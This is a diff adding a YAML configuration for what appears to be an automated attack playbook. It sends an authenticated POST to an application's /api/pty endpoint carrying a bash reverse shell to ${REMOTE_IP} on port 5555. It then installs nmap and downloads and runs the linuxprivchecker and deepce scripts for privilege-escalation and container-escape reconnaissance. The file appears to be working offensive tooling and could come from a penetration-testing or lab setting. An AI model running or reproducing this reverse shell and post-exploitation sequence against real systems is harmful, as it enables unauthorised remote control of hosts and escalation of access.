@@ -1,0 +1,40 @@
+---
+init_command:
+  permitted_exit_codes:
+    - 0
+    - -1
+  command: curl
+  args:
+    - -X
+    - POST
+    - -H
+    - "X-Auth-Token: ${AUTH_TOKEN}"
+    - -H
+    - "Accept: application/json"
+    - -H
+    - "Content-Type: application/json"
+    - -d
+    - '{"useShell": true, "command": ["exec 5<>/dev/tcp/${REMOTE_IP}/5555;cat <&5 | while read line; do $line 2>&5 >&5; done"]}'
+    - "${APP_URL}/api/pty"
+keepalive:
+  command: ls
+  period: 10
+commands:
+  - command_wait: 10
+    key: try-apt-update
+    command: "apt-get update"
+  - command_wait: 10
+    key: try-apt-update
+    command: "apt-get install -y curl nmap net-tools"
+  - command_wait: 5
+    key: download-privchecker
+    command: "curl -Lo linuxprivchecker.py https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py"
+  - command_wait: 30
+    key: run-privchecker
+    command: "python linuxprivchecker.py -w -o linuxprivchecker.log"
+  - command_wait: 5
+    key: download-deepce
+    command: "curl -Lo deepce.sh https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh"
+  - command_wait: 30
+    key: run-deepce
+    command: "sh -x ./deepce.sh"
